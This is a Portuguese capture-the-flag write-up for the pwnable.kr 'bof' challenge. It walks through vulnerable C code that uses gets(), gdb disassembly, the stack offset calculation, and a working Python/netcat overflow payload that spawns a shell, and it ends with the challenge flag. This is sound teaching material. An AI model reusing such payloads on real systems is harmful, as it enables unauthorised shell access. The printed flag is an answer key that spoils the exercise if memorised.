# bof

###### Solved by @beatriz-a-cardozo, @CupNudous

Este é um CTF sobre pwn, análise de código em C/C++ e Buffer Overflow.

## About the Challenge

O desafio consiste de dois arquivos chamados `bof`, um código em C e um executável que devem ser explorados para obter acesso a um *shell*.

>```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..
");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
``

O objetivo do desafio é modificar o valor da variável `key` para `0xcafebabe` e, com isso, executar `/bin/sh`.

## Solution

O código fonte mostra que a função `gets()` é utilizada para ler a entrada do usuário sem limite de tamanho, possibilitando a sobrescrita da variável `key`, que está localizada na *stack*.

Sobrecarregando a *stack* com 32 bytes, o terminal devolve uma mensagem de `*** stack smashing detected ***`

Ao descompilar a `main` do código pelo depurador `gdb` , o terminal devolve a seguinte tabela:

>```
(gdb) disas main
Dump of assembler code for function main:
   0x0000068a <+0>:    push   %ebp
   0x0000068b <+1>:    mov    %esp,%ebp
   0x0000068d <+3>:    and    $0xfffffff0,%esp
   0x00000690 <+6>:    sub    $0x10,%esp
   0x00000693 <+9>:    movl   $0xdeadbeef,(%esp)
   0x0000069a <+16>:    call   0x62c <func>
   0x0000069f <+21>:    mov    $0x0,%eax
   0x000006a4 <+26>:    leave  
   0x000006a5 <+27>:    ret    
End of assembler dump.
``

Já a função `func`, ao ser descompilada, devolve a seguinte tabela:

>```
(gdb) disas func
Dump of assembler code for function func:
   0x0000062c <+0>:    push   %ebp
   0x0000062d <+1>:    mov    %esp,%ebp
   0x0000062f <+3>:    sub    $0x48,%esp
   0x00000632 <+6>:    mov    %gs:0x14,%eax
   0x00000638 <+12>:    mov    %eax,-0xc(%ebp)
   0x0000063b <+15>:    xor    %eax,%eax
   0x0000063d <+17>:    movl   $0x78c,(%esp)
   0x00000644 <+24>:    call   0x645 <func+25>
   0x00000649 <+29>:    lea    -0x2c(%ebp),%eax
   0x0000064c <+32>:    mov    %eax,(%esp)
   0x0000064f <+35>:    call   0x650 <func+36>
   0x00000654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
   0x0000065b <+47>:    jne    0x66b <func+63>
   0x0000065d <+49>:    movl   $0x79b,(%esp)
   0x00000664 <+56>:    call   0x665 <func+57>
   0x00000669 <+61>:    jmp    0x677 <func+75>
   0x0000066b <+63>:    movl   $0x7a3,(%esp)
   0x00000672 <+70>:    call   0x673 <func+71>
   0x00000677 <+75>:    mov    -0xc(%ebp),%eax
   0x0000067a <+78>:    xor    %gs:0x14,%eax
   0x00000681 <+85>:    je     0x688 <func+92>
   0x00000683 <+87>:    call   0x684 <func+88>
   0x00000688 <+92>:    leave  
   0x00000689 <+93>:    ret    
End of assembler dump.
``

Analisando então a tabela extraída da `main` , é possível ver `deadbeef` sendo movido para o registrador `eax` na seguinte linha:

>`0x00000693 <+9>:    movl   $0xdeadbeef,(%esp)`

E essa linha em `func()` mostra a comparação com `0xcafebabe` no endereço `ebp + 8`:

>`0x00000654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)`

Colocando então um breakpoint na função `gets` e rodando o programa:

>```
(gdb) break gets
(gdb) run
(gdb) next
Single stepping until exit from function gets,
which has no line number information
booooooof
0x56555654 in func()
``

Através disso podemos printar o conteúdo de `$ebp+8`:

`(gdb) x $ebp+8`

`0xffffd320:    0xdeadbeef`

O endereço de `key` é então `0xffffd320`, só resta então descobrir onde o buffer começa, para descobrir a distancia entre os 2. Ao sobrescrever essa quantidade de bytes no buffer terminando com `cafebabe`, o novo valor vai sobrescrever `deadbeef` e a flag será alcançada.

Checando o começo do buffer:

`(gdb) x/1s $ebp-0x2c`

`0xffffd2ec:  "booooooof"`

O endereço inicial foi encontrado, só resta calcular a diferença entre os dois endereços, que é de 52 bytes e gerar o payload que vai nos permitir acessar o shell e a flag:

>`$ (python -c "print '\x01'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000`

>>`cat flag`

>>`daddy, I just pwned a buFFer :)`